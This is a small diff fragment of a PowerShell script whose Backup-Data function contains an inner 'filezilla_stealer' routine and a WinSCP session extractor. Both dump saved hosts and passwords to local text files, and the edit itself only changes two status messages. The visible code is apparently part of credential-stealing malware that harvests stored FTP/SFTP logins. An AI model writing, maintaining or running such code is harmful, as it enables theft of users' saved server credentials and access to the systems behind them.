@@ -629,7 +629,7 @@ function Backup-Data {
             }
         }
         $serversInfo | Out-File -FilePath "$filezilla_hosts\Hosts.txt" -Force
-		 Write-Host "[!] Filezilla Session information saved !" -ForegroundColor Green
+		 Write-Host "[!] Filezilla Session information saved" -ForegroundColor Green
     }
     filezilla_stealer
 	
@@ -709,7 +709,7 @@ function Backup-Data {
         $output += "Password : $password`n`n"
     }
     $output | Out-File -FilePath $outputPath
-    Write-Host "[!] WinSCP Session information saved !" -ForegroundColor Green
+    Write-Host "[!] WinSCP Session information saved" -ForegroundColor Green
    }
    Get-WinSCPSessions
 
